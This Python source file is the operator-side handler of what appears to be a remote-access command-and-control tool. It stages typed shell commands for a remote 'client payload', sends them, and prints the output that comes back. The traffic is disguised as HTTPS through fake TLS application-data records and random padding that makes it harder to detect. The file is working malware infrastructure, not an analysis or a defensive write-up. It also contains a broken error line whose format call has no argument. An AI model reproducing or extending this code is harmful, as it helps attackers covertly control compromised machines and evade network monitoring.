from src.Utilities  import *
from src.TLS        import *
from src.Payload    import *
from src.TextAssets import *

import socket
import time
import random
import threading

class ClientHandler:
        def __init__(self, client: object) -> None:
                self.client             = client
                self.queue              = None
                self.sate_thread        = None
                self.running            = True

        # Our slake method was appeasing the client for the time being. We need to
        # signal slake (in_use attribute), that way, we can begin receiving, parsing,
        # and sending data ourselves.

        @Public.Method
        def set_up(self) -> None:
                self.client.in_use      = True

                sate_thread             = threading.Thread(
                        target          = self.sate,
                        daemon          = True
                )
                sate_thread.start()
                self.sate_thread        = sate_thread

        @Public.Method
        def begin_communication(self) -> None:
                info("Begininng communication. (type 'CTRL+C' to quit)")

                self.sprint(self.client.pending)
                self.client.pending     = b""

                try:
                        while self.running:
                                if self.queue:
                                        time.sleep(0.1)
                                        continue

                                self.queue_command(input())

                except KeyboardInterrupt:
                        info("Backgrounding client...")
                        self.thwart()

                except Exception as exception:
                        error("Exception: {}".format())
                        self.thwart()

        @Public.Method
        def sate(self) -> None:
                while self.running:
                        if self.client.status == "Lost":
                                return

                        if not self.peek():
                                continue

                        self.parse()

        # The client payload can send a total of 2 things. A request for a command,
        # or the output of a command. If the client requests a command and we do not
        # have one ready, simply acknowledge the client. If the a command is ready,
        # send the client a command.

        # If scenario 2 was applied, we will see the client send over the executed
        # command. We must acknownledge the client as to maintain integrity of our
        # "HTTPS" server.

        @Private.Method
        def queue_command(self, command: str) -> None:
                if not self.running:
                        return

                self.queue              = command + "\n"
                info("Command staged.")

        @Private.Method
        def parse(self) -> None:
                request_byte            = 0x02
                has_data_byte           = 0x03

                record                  = self.client.connection.recv(5)
                length                  = int.from_bytes(record[3:])
                cipher                  = self.client.connection.recv(length)
                data                    = Payload.decrypt(cipher, self.client.key)

                if data[0] == request_byte and not self.queue:
                        self.ack()
                        return

                if data[0] == request_byte and self.queue:
                        info("Sending command.")
                        self.sendall()
                        return

                if data[0] == has_data_byte:
                        self.ack()
                        self.sprint(data)
                        return

        @Private.Method
        def ack(self) -> None:
                random_amount           = random.randint(1400, 2600)
                random_data             = random.randbytes(random_amount)
                data                    = b"\x01" + random_data
                cipher                  = Payload.encrypt(data, self.client.key)
                application             = Response.ApplicationData(cipher)
                self.client.connection.sendall(application)

        @Private.Method
        def sendall(self) -> None:
                command                 = self.queue.encode()
                command_length          = int.to_bytes(len(command), 2)
                random_amount           = random.randint(1400, 2600)
                random_data             = random.randbytes(random_amount)
                data                    = b"\x03" + command_length + command + random_data
                cipher                  = Payload.encrypt(data, self.client.key)
                application             = Response.ApplicationData(cipher)
                self.client.connection.sendall(application)
                self.queue              = None

        @Private.Method
        def sprint(self, data: bytes) -> None:
                sys_print(data.decode("utf-8", errors="replace"))
                flush()

        @Private.Method
        def thwart(self) -> None:
                self.running            = False
                self.client.in_use      = False

        @Private.Method
        def warn(self) -> None:
                if self.queue:
                        return

                debug("Press any button to continue.")


        @Private.Method
        def peek(self) -> bool:
                try:
                        self.client.connection.recv(1, socket.MSG_PEEK)
                        return True

                except BlockingIOError:
                        return False

                except Exception as exception:
                        error("Exception: {}".format(exception))
                        self.warn()
                        self.running       = False
                        self.client.status = "Lost"
                        self.client.connection.close()
                        return False